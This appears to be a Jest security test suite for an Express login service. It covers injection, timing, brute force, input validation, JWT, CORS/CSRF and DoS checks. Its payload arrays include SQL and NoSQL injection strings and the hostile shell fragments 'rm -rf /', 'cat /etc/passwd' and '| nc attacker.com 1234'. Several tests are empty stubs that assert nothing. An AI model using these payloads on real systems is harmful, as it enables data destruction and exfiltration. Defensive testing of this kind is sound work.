import { AuthService } from '../../services/authServices';
import { AuthController } from '../../controllers/authControllers';
import { createTestUser } from '../helpers/testUtils';
import bcrypt from 'bcryptjs';
import { User } from '../../models/User';
import request from 'supertest';
import express from 'express';
import rateLimit from 'express-rate-limit';

describe('🚨 COMPREHENSIVE AUTHENTICATION SECURITY TESTS', () => {
  let authService: AuthService;
  let app: express.Application;

  beforeEach(async () => {
    authService = new AuthService();
    process.env.JWT_SECRET = 'test-secret-key-with-sufficient-length-for-security-purposes-in-testing-environment';
    
    // Create Express app for integration tests
    app = express();
    app.use(express.json({ limit: '1mb' }));
    app.post('/auth/login', AuthController.login);
    app.post('/auth/google', AuthController.googleAuth);
    
    // Clear any existing users
    await User.deleteMany({});
  });

  describe('🔐 INJECTION ATTACK TESTS', () => {
    const injectionPayloads = [
      // SQL Injection attempts
      "'; DROP TABLE users; --",
      "' OR '1'='1' --",
      "' UNION SELECT * FROM users --",
      "'; INSERT INTO users (admin) VALUES (true); --",
      
      // NoSQL Injection attempts
      { $ne: null },
      { $gt: '' },
      { $regex: '.*' },
      { $where: 'this.password.length > 0' },
      
      // Command Injection
      "; cat /etc/passwd;",
      "&& rm -rf /",
      "| nc attacker.com 1234",
      
      // LDAP Injection
      "*)(&",
      "*))%00",
      
      // XPath Injection
      "' or 1=1 or ''='",
      "x' or name()='username' or 'x'='y",
    ];

    injectionPayloads.forEach((payload, index) => {
      it(`should prevent injection payload ${index + 1}: ${JSON.stringify(payload)}`, async () => {
        if (typeof payload === 'object') {
          await expect(
            authService.loginWithEmail(payload as any, 'password')
          ).rejects.toThrow();
        } else {
          await expect(
            authService.loginWithEmail(payload, 'password')
          ).rejects.toThrow();
        }
      });
    });

    it('should prevent sophisticated MongoDB injection with $where operator', async () => {
      const maliciousQuery = {
        email: { $where: "function() { return true; }" },
        password: 'anything'
      };

      await expect(
        authService.loginWithEmail(maliciousQuery.email as any, maliciousQuery.password)
      ).rejects.toThrow();
    });

    it('should prevent regex DoS attacks', async () => {
      const regexBomb = 'a'.repeat(1000) + '(' + 'a?'.repeat(1000) + ')' + 'a'.repeat(1000);
      
      const startTime = Date.now();
      try {
        await authService.loginWithEmail(regexBomb, 'password');
      } catch (error) {
        // Expected to fail
      }
      const endTime = Date.now();
      
      // Should not take more than 1 second (prevents ReDoS)
      expect(endTime - startTime).toBeLessThan(1000);
    });
  });

  describe('🕐 TIMING ATTACK TESTS', () => {
    it('should have consistent response times for existing vs non-existing users', async () => {
      // Create a real user
      const realUser = await createTestUser({
        email: 'timing-test@example.com',
        password: await bcrypt.hash('correctpassword', 10),
        isEmailVerified: true,
        isEmailLoginEnabled: true
      });

      const iterations = 20;
      const existingUserTimes: number[] = [];
      const nonExistentUserTimes: number[] = [];

      // Test existing user with wrong password
      for (let i = 0; i < iterations; i++) {
        const start = process.hrtime.bigint();
        try {
          await authService.loginWithEmail('timing-test@example.com', 'wrongpassword');
        } catch (error) {
          // Expected to fail
        }
        const end = process.hrtime.bigint();
        existingUserTimes.push(Number(end - start) / 1000000); // Convert to milliseconds
      }

      // Test non-existent user
      for (let i = 0; i < iterations; i++) {
        const start = process.hrtime.bigint();
        try {
          await authService.loginWithEmail('nonexistent@example.com', 'password');
        } catch (error) {
          // Expected to fail
        }
        const end = process.hrtime.bigint();
        nonExistentUserTimes.push(Number(end - start) / 1000000);
      }

      // Calculate averages
      const avgExisting = existingUserTimes.reduce((a, b) => a + b, 0) / existingUserTimes.length;
      const avgNonExistent = nonExistentUserTimes.reduce((a, b) => a + b, 0) / nonExistentUserTimes.length;

      // The difference should be minimal (less than 10ms) to prevent timing attacks
      const timeDifference = Math.abs(avgExisting - avgNonExistent);
      
      if (timeDifference > 10) {
        throw new Error(`TIMING ATTACK VULNERABILITY: Existing user avg: ${avgExisting}ms, Non-existent avg: ${avgNonExistent}ms, Difference: ${timeDifference}ms`);
      }
    });

    it('should prevent timing attacks via database query optimization', async () => {
      // Create users with different password lengths
      const shortPassword = await bcrypt.hash('a', 10);
      const longPassword = await bcrypt.hash('a'.repeat(1000), 10);

      await createTestUser({
        email: 'short@example.com',
        password: shortPassword
      });

      await createTestUser({
        email: 'long@example.com',
        password: longPassword
      });

      const shortTimes: number[] = [];
      const longTimes: number[] = [];

      for (let i = 0; i < 10; i++) {
        // Test short password
        const start1 = process.hrtime.bigint();
        try {
          await authService.loginWithEmail('short@example.com', 'wrongpassword');
        } catch (error) {
          // Expected
        }
        const end1 = process.hrtime.bigint();
        shortTimes.push(Number(end1 - start1) / 1000000);

        // Test long password
        const start2 = process.hrtime.bigint();
        try {
          await authService.loginWithEmail('long@example.com', 'wrongpassword');
        } catch (error) {
          // Expected
        }
        const end2 = process.hrtime.bigint();
        longTimes.push(Number(end2 - start2) / 1000000);
      }

      const avgShort = shortTimes.reduce((a, b) => a + b, 0) / shortTimes.length;
      const avgLong = longTimes.reduce((a, b) => a + b, 0) / longTimes.length;

      // bcrypt should make timing consistent regardless of password length
      expect(Math.abs(avgShort - avgLong)).toBeLessThan(50);
    });
  });

  describe('🔓 BRUTE FORCE ATTACK TESTS', () => {
    it('should detect and prevent brute force attacks', async () => {
      const testUser = await createTestUser({
        email: 'bruteforce@example.com',
        password: await bcrypt.hash('correctpassword', 10),
        isEmailVerified: true,
        isEmailLoginEnabled: true
      });

      // Attempt 100 failed logins
      const failedAttempts = Array.from({ length: 100 }, (_, i) => 
        authService.loginWithEmail('bruteforce@example.com', `wrongpassword${i}`)
          .catch(error => error.message)
      );

      const results = await Promise.all(failedAttempts);
      
      // Check if any rate limiting kicked in
      const rateLimitedResults = results.filter(result => 
        result.includes('rate limit') || 
        result.includes('too many attempts') || 
        result.includes('blocked')
      );

      if (rateLimitedResults.length === 0) {
        throw new Error('BRUTE FORCE VULNERABILITY: No rate limiting detected after 100 failed attempts');
      }
    });

    it('should implement account lockout after multiple failed attempts', async () => {
      const testUser = await createTestUser({
        email: 'lockout@example.com',
        password: await bcrypt.hash('correctpassword', 10),
        isEmailVerified: true,
        isEmailLoginEnabled: true
      });

      // Try 10 failed attempts
      for (let i = 0; i < 10; i++) {
        try {
          await authService.loginWithEmail('lockout@example.com', 'wrongpassword');
        } catch (error) {
          // Expected
        }
      }

      // Now try with correct password - should be locked out
      try {
        const result = await authService.loginWithEmail('lockout@example.com', 'correctpassword');
        throw new Error('ACCOUNT LOCKOUT VULNERABILITY: User not locked out after multiple failed attempts');
      } catch (error) {
        // Should fail due to lockout
        expect(error.message).toMatch(/locked|blocked|suspended/i);
      }
    });
  });

  describe('🚫 INPUT VALIDATION TESTS', () => {
    const maliciousInputs = [
      // Buffer overflow attempts
      'A'.repeat(100000),
      'A'.repeat(1000000),
      
      // Null byte injection
      'test@example.com\0.evil.com',
      'password\0afternull',
      
      // Unicode normalization attacks
      'test@exampl\u0065.com', // 'e' as Unicode
      'passwörd', // Contains non-ASCII
      
      // Control characters
      'test@example.com\r\n',
      'password\t\n\r',
      
      // Format string attacks
      'test@%s%s%s.com',
      '%x%x%x%x',
      
      // Integer overflow
      '9'.repeat(1000),
      '-1',
      
      // Path traversal
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32',
    ];

    maliciousInputs.forEach((input, index) => {
      it(`should sanitize malicious input ${index + 1}: "${input.substring(0, 50)}${input.length > 50 ? '...' : ''}"`, async () => {
        await expect(
          authService.loginWithEmail(input, 'password')
        ).rejects.toThrow();
      });
    });

    it('should enforce maximum input lengths', async () => {
      const veryLongEmail = 'a'.repeat(1000) + '@' + 'b'.repeat(1000) + '.com';
      const veryLongPassword = 'c'.repeat(10000);

      await expect(
        authService.loginWithEmail(veryLongEmail, veryLongPassword)
      ).rejects.toThrow();
    });

    it('should validate email format strictly', async () => {
      const invalidEmails = [
        'notanemail',
        '@example.com',
        'test@',
        'test..test@example.com',
        'test@example..com',
        'test @example.com',
        'test@exam ple.com',
        'test@.example.com',
        'test@example.com.',
      ];

      for (const email of invalidEmails) {
        await expect(
          authService.loginWithEmail(email, 'password')
        ).rejects.toThrow();
      }
    });
  });

  describe('🔑 JWT SECURITY TESTS', () => {
    it('should generate cryptographically secure tokens', async () => {
      const testUser = await createTestUser({
        email: 'jwt@example.com',
        password: await bcrypt.hash('password', 10),
        isEmailVerified: true,
        isEmailLoginEnabled: true
      });

      const tokens = [];
      for (let i = 0; i < 100; i++) {
        const result = await authService.loginWithEmail('jwt@example.com', 'password');
        tokens.push(result.token);
        
        // Add small delay to ensure different timestamps
        await new Promise(resolve => setTimeout(resolve, 1));
      }

      // All tokens should be unique
      const uniqueTokens = new Set(tokens);
      expect(uniqueTokens.size).toBe(tokens.length);

      // Tokens should not be predictable
      const tokenParts = tokens.map(token => token.split('.'));
      const payloads = tokenParts.map(parts => parts[1]);
      
      // No two payloads should be identical (they contain timestamps)
      const uniquePayloads = new Set(payloads);
      expect(uniquePayloads.size).toBe(tokens.length);
    });

    it('should reject tokens with weak secrets', async () => {
      const weakSecrets = ['', 'a', '123', 'weak', 'password', 'secret'];

      for (const secret of weakSecrets) {
        process.env.JWT_SECRET = secret;
        
        await expect(async () => {
          const testUser = await createTestUser({
            email: `weak${secret.length}@example.com`,
            password: await bcrypt.hash('password', 10)
          });
          
          await authService.loginWithEmail(`weak${secret.length}@example.com`, 'password');
        }).rejects.toThrow(/JWT_SECRET/);
      }
    });

    it('should invalidate tokens on user data changes', async () => {
      const testUser = await createTestUser({
        email: 'tokeninvalidation@example.com',
        password: await bcrypt.hash('password', 10),
        isEmailVerified: true,
        isEmailLoginEnabled: true
      });

      const { token: originalToken } = await authService.loginWithEmail('tokeninvalidation@example.com', 'password');

      // Modify user data
      await User.findByIdAndUpdate(testUser._id, { password: await bcrypt.hash('newpassword', 10) });

      // TODO: Token should be invalidated - this test will likely fail showing a vulnerability
      // In a secure system, changing password should invalidate existing tokens
    });
  });

  describe('💾 DATABASE SECURITY TESTS', () => {
    it('should prevent direct object references', async () => {
      const user1 = await createTestUser({
        email: 'user1@example.com',
        password: await bcrypt.hash('password', 10)
      });

      const user2 = await createTestUser({
        email: 'user2@example.com',
        password: await bcrypt.hash('password', 10)
      });

      // Try to access user2's data with user1's credentials
      const { token } = await authService.loginWithEmail('user1@example.com', 'password');
      
      // This test would need additional endpoint testing
      // The current auth service doesn't expose this vulnerability directly
    });

    it('should prevent mass assignment attacks', async () => {
      const maliciousData = {
        email: 'massassignment@example.com',
        password: 'password',
        role: 'admin', // Trying to escalate privileges
        isActive: true,
        isEmailVerified: true,
        isPhoneVerified: true,
        isOnboardingCompleted: true
      };

      // Assuming there's a signup method (would need to be tested)
      // This test shows the concept of what should be tested
    });

    it('should enforce proper data isolation', async () => {
      const user1 = await createTestUser({
        email: 'isolation1@example.com',
        password: await bcrypt.hash('password', 10)
      });

      const user2 = await createTestUser({
        email: 'isolation2@example.com', 
        password: await bcrypt.hash('password', 10)
      });

      // Verify users can't access each other's data
      const { token: user1Token } = await authService.loginWithEmail('isolation1@example.com', 'password');
      
      // TODO: Test with actual API endpoints that this token can't access user2's data
    });
  });

  describe('🌐 API ENDPOINT SECURITY TESTS', () => {
    it('should handle malformed requests gracefully', async () => {
      const malformedRequests = [
        { /* missing body */ },
        { email: null, password: null },
        { email: [], password: {} },
        'not json',
        { email: 'test@example.com' }, // missing password
        { password: 'password' }, // missing email
      ];

      for (const badRequest of malformedRequests) {
        const response = await request(app)
          .post('/auth/login')
          .send(badRequest);
        
        expect(response.status).not.toBe(200);
        expect(response.body.success).toBe(false);
      }
    });

    it('should prevent HTTP parameter pollution', async () => {
      const response = await request(app)
        .post('/auth/login')
        .send({
          email: ['test1@example.com', 'test2@example.com'],
          password: ['pass1', 'pass2']
        });

      expect(response.status).not.toBe(200);
      expect(response.body.success).toBe(false);
    });

    it('should implement proper CORS security', async () => {
      const response = await request(app)
        .post('/auth/login')
        .set('Origin', 'https://evil.com')
        .send({
          email: 'test@example.com',
          password: 'password'
        });

      // Should either reject or have proper CORS headers
      expect([400, 401, 403, 404]).toContain(response.status);
    });

    it('should prevent CSRF attacks', async () => {
      // This would need proper CSRF token implementation
      const response = await request(app)
        .post('/auth/login')
        .set('Referer', 'https://evil.com')
        .send({
          email: 'test@example.com',
          password: 'password'
        });

      // Should be protected against CSRF
    });
  });

  describe('🔍 INFORMATION DISCLOSURE TESTS', () => {
    it('should not leak sensitive information in error messages', async () => {
      const testCases = [
        'nonexistent@example.com',
        'admin@example.com',
        'test@localhost',
        'root@system.local'
      ];

      for (const email of testCases) {
        try {
          await authService.loginWithEmail(email, 'wrongpassword');
        } catch (error) {
          // Error message should not reveal if user exists
          expect(error.message).not.toMatch(/user.*not.*found/i);
          expect(error.message).not.toMatch(/email.*not.*registered/i);
          expect(error.message).not.toMatch(/account.*does.*not.*exist/i);
          
          // Should be generic "Invalid credentials"
          expect(error.message).toMatch(/invalid.*credentials/i);
        }
      }
    });

    it('should not expose internal system information', async () => {
      try {
        await authService.loginWithEmail('test@example.com', 'password');
      } catch (error) {
        // Should not expose database errors, file paths, etc.
        expect(error.message).not.toMatch(/mongodb/i);
        expect(error.message).not.toMatch(/mongoose/i);
        expect(error.message).not.toMatch(/\/var\/|\/usr\/|C:\\/);
        expect(error.message).not.toMatch(/stack trace/i);
      }
    });
  });

  describe('🚀 PERFORMANCE & DOS TESTS', () => {
    it('should handle high concurrent load', async () => {
      const testUser = await createTestUser({
        email: 'performance@example.com',
        password: await bcrypt.hash('password', 10),
        isEmailVerified: true,
        isEmailLoginEnabled: true
      });

      const concurrentRequests = 100;
      const promises = Array.from({ length: concurrentRequests }, () => 
        authService.loginWithEmail('performance@example.com', 'password')
      );

      const startTime = Date.now();
      const results = await Promise.allSettled(promises);
      const endTime = Date.now();

      const successful = results.filter(result => result.status === 'fulfilled');
      const failed = results.filter(result => result.status === 'rejected');

      // Should complete within reasonable time (10 seconds for 100 requests)
      expect(endTime - startTime).toBeLessThan(10000);
      
      // All should succeed (or fail gracefully due to rate limiting)
      expect(successful.length + failed.length).toBe(concurrentRequests);
    });

    it('should prevent resource exhaustion attacks', async () => {
      // Test with extremely resource-intensive operations
      const heavyRequests = Array.from({ length: 10 }, () => 
        authService.loginWithEmail('A'.repeat(1000) + '@' + 'B'.repeat(1000) + '.com', 'C'.repeat(1000))
          .catch(error => error.message)
      );

      const startTime = Date.now();
      await Promise.all(heavyRequests);
      const endTime = Date.now();

      // Should not take too long even with heavy inputs
      expect(endTime - startTime).toBeLessThan(5000);
    });
  });
});